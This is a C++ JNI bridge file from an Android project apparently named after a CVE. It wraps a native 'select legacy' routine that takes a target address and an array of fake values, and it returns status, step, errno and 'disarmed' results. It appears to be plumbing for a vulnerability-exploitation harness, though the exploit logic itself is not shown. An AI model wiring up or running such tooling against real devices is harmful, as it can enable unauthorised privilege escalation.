#include <jni.h>

#include <cstdint>

extern "C" int ghostlock_select_legacy_run(std::uint64_t target, std::int32_t mode,
                                           std::int32_t preserve_child,
                                           const std::uint64_t *fake_values,
                                           std::int32_t *out_status, std::int32_t *out_step,
                                           std::int32_t *out_errno, std::int32_t *out_clean,
                                           std::int32_t *out_disarmed) noexcept;

namespace {
    constexpr jsize kResultBytes = 32;
    void put32(jbyte *p, std::int32_t v) noexcept {
        const std::uint32_t u = static_cast<std::uint32_t>(v);
        p[0] = static_cast<jbyte>(u); p[1] = static_cast<jbyte>(u >> 8U);
        p[2] = static_cast<jbyte>(u >> 16U); p[3] = static_cast<jbyte>(u >> 24U);
    }
}  // namespace

extern "C" JNIEXPORT jbyteArray JNICALL
Java_com_ghostlock_app_jni_cve43499_NativeSelectLegacyJni_execute(
    JNIEnv *env, jclass, jlong target, jint mode, jint preserve_child, jlongArray fake_array) {
    std::int32_t status = -1, step = 0, error = 0, clean = 0, disarmed = 0;
    std::uint64_t fake[10] = {};
    if (fake_array != nullptr) {
        const jsize count = env->GetArrayLength(fake_array);
        if (count > 10) return nullptr;
        jlong *values = env->GetLongArrayElements(fake_array, nullptr);
        if (values == nullptr) return nullptr;
        for (jsize i = 0; i < count; ++i) fake[i] = static_cast<std::uint64_t>(values[i]);
        env->ReleaseLongArrayElements(fake_array, values, JNI_ABORT);
    }
    if (ghostlock_select_legacy_run(static_cast<std::uint64_t>(target), mode, preserve_child, fake,
                                    &status, &step, &error, &clean, &disarmed) != 0) {
        return nullptr;
    }
    jbyte out[kResultBytes] = {};
    put32(out, status); put32(out + 4, step); put32(out + 8, error);
    put32(out + 12, clean); put32(out + 16, disarmed);
    jbyteArray answer = env->NewByteArray(kResultBytes);
    if (answer == nullptr) return nullptr;
    env->SetByteArrayRegion(answer, 0, kResultBytes, out);
    return answer;
}
